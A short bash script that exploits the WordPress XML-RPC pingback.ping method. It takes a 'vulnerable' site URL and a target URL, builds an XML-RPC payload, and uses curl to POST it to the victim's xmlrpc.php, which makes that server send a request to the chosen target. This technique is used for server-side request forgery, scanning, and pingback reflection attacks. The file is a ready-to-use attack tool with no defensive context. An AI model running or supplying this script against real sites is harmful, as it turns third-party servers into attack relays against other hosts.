#!/bin/bash
greenCol="\e[0;32m\033[1m"
endCol="\033[0m\e[0m"
purpleCol="\e[0;35m\033[1m"

if [ $# -ne 2 ]; then
  echo -e "Use: ${greenCol}$0${purpleCol} [ url-vulnerable ] [ url-to-ping ]${endCol}"
  exit 1
fi

victim=$1
target=$2

xmlrpc_payload="<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>$victim</string></value></param><param><value><string>$target</string></value></param></params></methodCall>"

echo "Send pingback from $victim to $target..."

curl -X POST $victim/xmlrpc.php -d "$xmlrpc_payload"
